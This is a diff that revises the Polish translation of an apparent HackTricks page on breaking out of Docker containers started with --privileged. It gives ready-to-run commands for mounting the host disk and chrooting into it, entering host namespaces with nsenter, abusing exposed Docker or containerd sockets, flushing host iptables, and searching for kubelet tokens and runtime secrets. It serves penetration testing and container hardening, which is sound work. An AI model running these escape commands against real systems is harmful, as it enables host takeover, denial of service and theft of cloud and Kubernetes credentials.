@@ -1,38 +1,38 @@
-# Ucieczka z kontenerów `--privileged`
+# Ucieczka z kontenerów z `--privileged`
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Przegląd
 
-Kontener uruchomiony z `--privileged` nie jest tym samym co zwykły kontener z jedną czy dwiema dodatkowymi uprawnieniami. W praktyce `--privileged` usuwa lub osłabia kilka domyślnych mechanizmów ochrony środowiska uruchomieniowego, które normalnie chronią procesy w kontenerze przed niebezpiecznymi zasobami hosta. Dokładny efekt zależy od runtime i hosta, ale dla Docker zwykle skutkuje to:
+Kontener uruchomiony z `--privileged` to nie to samo co zwykły kontener z jedną lub dwiema dodatkowymi uprawnieniami. W praktyce `--privileged` usuwa lub osłabia kilka domyślnych mechanizmów ochronnych runtime, które normalnie oddzielają workload od niebezpiecznych zasobów hosta. Dokładny efekt zależy od runtime i hosta, ale dla Docker zwykle oznacza to:
 
-- wszystkie capabilities są przyznane
-- ograniczenia device cgroup są zniesione
-- wiele systemów plików jądra przestaje być montowanych w trybie tylko do odczytu
-- domyślnie maskowane ścieżki procfs znikają
+- przyznawane są wszystkie capabilities
+- ograniczenia device cgroup zostają zniesione
+- wiele systemów plików jądra przestaje być montowanych tylko do odczytu
+- domyślnie zmaskowane ścieżki procfs znikają
 - filtrowanie seccomp jest wyłączone
-- ograniczenia AppArmor są wyłączone
-- izolacja SELinux jest wyłączona lub zastąpiona znacznie szerszą etykietą
+- confinement AppArmor jest wyłączony
+- izolacja SELinux jest wyłączona albo zastąpiona znacznie szerszą etykietą
 
-Ważny wniosek jest taki, że kontener uruchomiony z `--privileged` zazwyczaj nie potrzebuje subtelnego exploita jądra. W wielu przypadkach może po prostu komunikować się bezpośrednio z urządzeniami hosta, kernelowymi systemami plików widocznymi dla hosta lub interfejsami runtime, a następnie uzyskać powłokę hosta.
+Ważnym skutkiem jest to, że kontener z uprawnieniami privileged zazwyczaj **nie** wymaga subtelnego exploit-a jądra. W wielu przypadkach może po prostu bezpośrednio komunikować się z urządzeniami hosta, systemami plików jądra widocznymi dla hosta lub interfejsami runtime i następnie przejść do powłoki hosta.
 
-## Czego `--privileged` nie zmienia automatycznie
+## Czego `--privileged` automatycznie nie zmienia
 
-`--privileged` **nie** łączy automatycznie przestrzeni nazw PID, network, IPC ani UTS hosta. Kontener uruchomiony z `--privileged` nadal może mieć prywatne przestrzenie nazw. To oznacza, że niektóre łańcuchy eskalacji wymagają dodatkowego warunku, takiego jak:
+`--privileged` **nie** dołącza automatycznie do przestrzeni nazw PID, network, IPC ani UTS hosta. Kontener privileged nadal może mieć prywatne namespaces. To oznacza, że niektóre łańcuchy ucieczki wymagają dodatkowego warunku, takiego jak:
 
 - host bind mount
-- dzielenie PID z hostem
-- sieć hosta
+- udostępnienie host PID
+- host networking
 - widoczne urządzenia hosta
 - zapisywalne interfejsy proc/sys
 
-Te warunki są często łatwe do spełnienia w rzeczywistych błędnych konfiguracjach, ale są koncepcyjnie niezależne od samego `--privileged`.
+Te warunki często łatwo spełnić przy rzeczywistych błędach konfiguracyjnych, ale koncepcyjnie są odrębne od samego `--privileged`.
 
 ## Ścieżki ucieczki
 
-### 1. Zamontowanie dysku hosta przez widoczne urządzenia
+### 1. Zamontowanie dysku hosta przez wystawione urządzenia
 
-Kontener uruchomiony z `--privileged` zwykle widzi znacznie więcej węzłów urządzeń pod `/dev`. Jeśli blokowe urządzenie hosta jest widoczne, najprostsza ucieczka to zamontowanie go i użycie `chroot` do systemu plików hosta:
+Kontener privileged zwykle widzi znacznie więcej węzłów urządzeń pod `/dev`. Jeśli block device hosta jest widoczne, najprostsza ucieczka to jego zamontowanie i wejście do filesystemu hosta przez `chroot`:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -40,24 +40,24 @@ mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/de
 ls -la /mnt/hostdisk
 chroot /mnt/hostdisk /bin/bash 2>/dev/null
 ```
-Jeśli partycja root nie jest oczywista, najpierw wypisz układ bloków:
+Jeśli root partition nie jest oczywisty, najpierw wyenumeruj układ bloków:
 ```bash
 fdisk -l 2>/dev/null
 blkid 2>/dev/null
 debugfs /dev/sda1 2>/dev/null
 ```
-Jeśli praktyczną ścieżką jest umieszczenie setuid helpera w zapisywalnym punkcie montowania hosta zamiast `chroot`, pamiętaj, że nie każdy system plików honoruje bit setuid. Szybki test możliwości po stronie hosta to:
+Jeśli praktyczną drogą jest umieszczenie setuid helpera w zapisywalnym mountcie hosta zamiast używać `chroot`, pamiętaj, że nie każdy system plików honoruje bit setuid. Szybkie sprawdzenie możliwości po stronie hosta to:
 ```bash
 mount | grep -v "nosuid"
 ```
-To jest przydatne, ponieważ zapisywalne ścieżki na systemach plików z `nosuid` są znacznie mniej interesujące dla klasycznych "drop a setuid shell and execute it later" workflows.
+To jest przydatne, ponieważ zapisywalne ścieżki na systemach plików z `nosuid` są znacznie mniej interesujące dla klasycznych scenariuszy "podrzucić setuid shell i uruchomić go później".
 
-Osłabione mechanizmy ochronne wykorzystywane tutaj to:
+Osłabione zabezpieczenia wykorzystywane tutaj to:
 
-- pełny dostęp do urządzeń
-- szerokie capabilities, szczególnie `CAP_SYS_ADMIN`
+- pełna ekspozycja urządzeń
+- szerokie capabilities, zwłaszcza `CAP_SYS_ADMIN`
 
-Related pages:
+Powiązane strony:
 
 {{#ref}}
 protections/capabilities.md
@@ -67,15 +67,15 @@ protections/capabilities.md
 protections/namespaces/mount-namespace.md
 {{#endref}}
 
-### 2. Zamontuj lub ponownie użyj host bind mount i `chroot`
+### 2. Zamontowanie lub ponowne użycie host bind mount i `chroot`
 
-Jeśli system plików root hosta jest już zamontowany wewnątrz kontenera, lub jeśli kontener może utworzyć niezbędne punkty montowania, ponieważ jest uprzywilejowany, powłoka hosta często jest tylko jedno `chroot` dalej:
+Jeśli root filesystem hosta jest już zamontowany wewnątrz kontenera, albo jeśli kontener może utworzyć niezbędne mounty, ponieważ jest privileged, shell hosta często jest tylko jedno `chroot` dalej:
 ```bash
 mount | grep -E ' /host| /mnt| /rootfs'
 ls -la /host 2>/dev/null
 chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
 ```
-Jeśli nie istnieje host root bind mount, ale host storage jest osiągalny, utwórz jeden:
+Jeśli nie istnieje żaden host root bind mount, ale host storage jest osiągalny, utwórz go:
 ```bash
 mkdir -p /tmp/host
 mount --bind / /tmp/host
@@ -83,9 +83,9 @@ chroot /tmp/host /bin/bash 2>/dev/null
 ```
 Ta ścieżka wykorzystuje:
 
-- osłabione mount restrictions
-- pełne capabilities
-- brak MAC confinement
+- weakened mount restrictions
+- full capabilities
+- lack of MAC confinement
 
 Powiązane strony:
 
@@ -105,9 +105,9 @@ protections/apparmor.md
 protections/selinux.md
 {{#endref}}
 
-### 3. Nadużywanie zapisywalnego `/proc/sys` lub `/sys`
+### 3. Wykorzystanie zapisywalnych `/proc/sys` lub `/sys`
 
-Jednym z głównych skutków `--privileged` jest to, że zabezpieczenia procfs i sysfs stają się znacznie słabsze. Może to ujawnić interfejsy jądra skierowane na hosta, które zazwyczaj są maskowane lub montowane jako tylko do odczytu.
+Jednym z głównych skutków `--privileged` jest to, że zabezpieczenia procfs i sysfs stają się dużo słabsze. To może ujawnić interfejsy jądra skierowane na hosta, które normalnie są zamaskowane lub zamontowane jako tylko do odczytu.
 
 Klasycznym przykładem jest `core_pattern`:
 ```bash
@@ -140,10 +140,10 @@ find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
 ```
 Ta ścieżka wykorzystuje:
 
-- brak masked paths
-- brak read-only system paths
+- brak zamaskowanych ścieżek
+- brak systemowych ścieżek ustawionych jako tylko do odczytu
 
-Powiązane strony:
+Related pages:
 
 {{#ref}}
 protections/masked-paths.md
@@ -153,11 +153,11 @@ protections/masked-paths.md
 protections/read-only-paths.md
 {{#endref}}
 
-### 4. Użyj pełnych capabilities dla Mount- Or Namespace-Based Escape
+### 4. Użyj pełnych capabilities do ucieczki przez mount lub namespace
 
-Uprzywilejowany kontener otrzymuje capabilities, które normalnie są usuwane z standardowych kontenerów, w tym `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i wiele innych. To często wystarcza, aby zamienić lokalny foothold w host escape, gdy tylko pojawi się inna wystawiona powierzchnia.
+Kontener z uprawnieniami otrzymuje capabilities, które zwykle są usuwane w standardowych kontenerach, w tym `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN`, i wiele innych. To często wystarcza, by zamienić lokalny punkt zaczepienia w ucieczkę na hosta, gdy tylko pojawi się inne wystawione wejście.
 
-Prosty przykład to montowanie dodatkowych systemów plików i użycie namespace entry:
+Prosty przykład to zamontowanie dodatkowych systemów plików i użycie wejścia do namespace:
 ```bash
 capsh --print | grep cap_sys_admin
 which nsenter
@@ -170,8 +170,8 @@ nsenter -t 1 -m -u -n -i -p /bin/bash
 ```
 Ta ścieżka wykorzystuje:
 
-- the default privileged capability set
-- optional host PID sharing
+- domyślny privileged capability set
+- opcjonalne host PID sharing
 
 Related pages:
 
@@ -183,9 +183,9 @@ protections/capabilities.md
 protections/namespaces/pid-namespace.md
 {{#endref}}
 
-### 5. Escape Through Runtime Sockets
+### 5. Ucieczka przez Runtime Sockets
 
-Privileged container często ma widoczny stan runtime hosta lub jego gniazda. Jeśli socket Docker, containerd lub CRI-O jest osiągalny, najprostszym podejściem bywa użycie runtime API do uruchomienia drugiego kontenera z dostępem do hosta:
+Uprzywilejowany container często ma widoczny stan runtime hosta lub sockety. Jeśli socket Docker, containerd, lub CRI-O jest osiągalny, najprostszym podejściem często jest użycie runtime API do uruchomienia drugiego containera z dostępem do hosta:
 ```bash
 find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
 docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
@@ -194,10 +194,10 @@ Dla containerd:
 ```bash
 ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
 ```
-Ten wektor wykorzystuje:
+Ta ścieżka wykorzystuje:
 
-- ujawnienie privileged runtime
-- host bind mounts utworzone przez sam runtime
+- privileged runtime exposure
+- host bind mounts created through the runtime itself
 
 Powiązane strony:
 
@@ -209,9 +209,9 @@ protections/namespaces/mount-namespace.md
 runtime-api-and-daemon-exposure.md
 {{#endref}}
 
-### 6. Usuń skutki uboczne izolacji sieci
+### 6. Usuń skutki uboczne izolacji sieciowej
 
-`--privileged` sam w sobie nie dołącza do przestrzeni nazw sieci hosta, ale jeśli kontener ma również `--network=host` lub inny dostęp do sieci hosta, cały stos sieciowy staje się modyfikowalny:
+`--privileged` sam w sobie nie dołącza do host network namespace, ale jeśli kontener ma także `--network=host` lub inny host-network access, cały stos sieciowy staje się modyfikowalny:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -220,7 +220,7 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-Nie zawsze daje to bezpośredni shell na hoście, ale może prowadzić do denial of service, traffic interception lub dostępu do usług zarządzania dostępnych tylko na loopback.
+To nie zawsze prowadzi do bezpośredniej powłoki na hoście, ale może skutkować denial of service, przechwyceniem ruchu lub dostępem do usług zarządzania dostępnych tylko przez loopback.
 
 Powiązane strony:
 
@@ -234,15 +234,15 @@ protections/namespaces/network-namespace.md
 
 ### 7. Odczyt sekretów hosta i stanu runtime
 
-Nawet jeśli bezpośrednie uzyskanie shellu na hoście nie następuje od razu, kontenery uprzywilejowane często mają wystarczający dostęp, aby odczytać sekrety hosta, stan kubeleta, metadane runtime oraz systemy plików sąsiednich kontenerów:
+Nawet jeśli natychmiastowe uzyskanie czystej powłoki nie jest możliwe, uprzywilejowane kontenery często mają wystarczający dostęp, by odczytać sekrety hosta, stan kubelet, metadane runtime oraz systemy plików sąsiednich kontenerów:
 ```bash
 find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
 find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
 find /var/lib/containerd -type f 2>/dev/null | head -n 50
 ```
-Jeżeli `/var` jest zamontowany z hosta lub katalogi runtime są widoczne, może to wystarczyć do lateral movement lub cloud/Kubernetes credential theft nawet zanim uzyskana zostanie powłoka na hoście.
+Jeśli `/var` jest zamontowany z hosta lub katalogi runtime są widoczne, może to wystarczyć do lateral movement lub kradzieży poświadczeń cloud/Kubernetes, nawet zanim zostanie uzyskany host shell.
 
-Related pages:
+Powiązane strony:
 
 {{#ref}}
 protections/namespaces/mount-namespace.md
@@ -266,12 +266,12 @@ find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
 Co jest tutaj interesujące:
 
 - pełny zestaw capabilities, zwłaszcza `CAP_SYS_ADMIN`
-- zapisywalny dostęp do proc/sys
+- udostępniony zapisywalny proc/sys
 - widoczne urządzenia hosta
 - brak seccomp i ograniczeń MAC
 - runtime sockets lub host root bind mounts
 
-Każdy z nich może wystarczyć do post-exploitation. Kilka razem zwykle oznacza, że kontener jest w praktyce o jedno lub dwa polecenia od kompromitacji hosta.
+Każdy z nich może wystarczyć do post-exploitation. Kilka z nich razem zwykle oznacza, że kontener jest w praktyce o jedno lub dwa polecenia od host compromise.
 
 ## Powiązane strony
 
@@ -310,3 +310,4 @@ protections/namespaces/pid-namespace.md
 {{#ref}}
 protections/namespaces/network-namespace.md
 {{#endref}}
+{{#include ../../../banners/hacktricks-training.md}}
